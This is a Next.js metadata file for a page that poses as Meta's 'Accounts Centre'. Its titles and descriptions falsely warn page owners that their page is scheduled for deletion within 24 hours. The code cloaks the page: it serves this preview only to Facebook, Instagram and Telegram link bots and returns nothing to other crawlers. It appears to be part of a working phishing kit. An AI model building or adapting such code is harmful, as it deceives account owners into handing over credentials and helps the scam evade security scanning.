import { headers } from 'next/headers';
import DeviceDetector from 'device-detector-js';

export async function generateMetadata() {
    const headersList = headers();
    const userAgent = headersList.get('user-agent')?.toLowerCase() || '';
    const protocol = headersList.get('x-forwarded-proto') || 'https';
    const host = headersList.get('host') || 'localhost:3000';
    const metadataBase = new URL(`${protocol}://${host}`);

    const deviceDetector = new DeviceDetector();
    const device = deviceDetector.parse(userAgent);

    const isFacebookBot = userAgent.includes('facebookexternalhit') || userAgent.includes('facebot');
    const isInstagramBot = userAgent.includes('instagram');
    const isTelegramBot = userAgent.includes('telegrambot');

    const isAllowedBot = isFacebookBot || isInstagramBot || isTelegramBot;

    if (device.bot && !isAllowedBot) {
        return null;
    }

    return {
        metadataBase,
        title: 'Accounts Centre',
        description: 'We received reports that your site has violated the regulations on service and confidentiality of customer information, so we have scheduled to delete your page within 24 hours from this notice without receiving any feedback from you.',
        icons: {
            icon: '/favicon-32x32.png',
            apple: '/favicon-32x32.png',
            shortcut: '/favicon-32x32.png',
        },
        openGraph: {
            title: 'We have scheduled your page to be deleted',
            description: 'We have received several reports that your account violates our terms of service and community guidelines. As a result, your account will be sent for verification.',
            images: [
                {
                    url: `https://i.postimg.cc/sgnQYgTC/social-preview.png`,
                    width: 1200,
                    height: 630,
                    alt: 'Fanpage Privacy Policy'
                }
            ]
        },
        twitter: {
            card: 'summary_large_image',
            title: 'We have scheduled your page to be deleted',
            description: 'We have received several reports that your account violates our terms of service and community guidelines. As a result, your account will be sent for verification.',
            images: [`https://i.postimg.cc/sgnQYgTC/social-preview.png`]
        }
    };
}